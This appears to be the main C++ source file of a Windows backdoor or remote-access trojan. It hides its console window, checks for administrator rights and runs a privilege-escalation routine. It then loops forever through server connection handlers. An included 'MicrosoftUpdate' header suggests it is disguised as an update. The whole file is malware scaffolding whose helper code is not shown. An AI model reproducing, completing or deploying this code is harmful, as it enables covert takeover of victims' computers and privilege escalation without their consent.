#include <iostream>
#include <time.h>

#include "MicrosoftUpdate.h"
#include "ServerConnection.h"
#include "System.h"
#include "PrivilegeEscalation.h"
#include "ConnectionHandler.h"
#include "Wait.h"
#include "Log.h"

#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char** argv)
{
	// Hide the CMD prompt window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// System Properties Configuration
	System::setArguments(argc, argv);
	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());

	// Privilege Escalation
	if (!(System::getIsSystemAdmin() || System::checkForArgument("d")))
	{
		if (PrivilegeEscalation::run())
		{
			exit(0);
		}
	}
	
	// Enable Loggin to Screen (For Testing)
	Log::setLogging(true);

	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());
	if (System::getIsSystemAdmin())
	{
		Log::log("Running as an Administrator!");
	}
	else
	{
		Log::log("Running as Low Privileged!");
	}

	ConnectionHandler* handler = new Wait();
	while (true)
	{
		handler = handler->run();
		if (!handler)
		{
			handler = new Wait();
		}
	}

	return 0;
}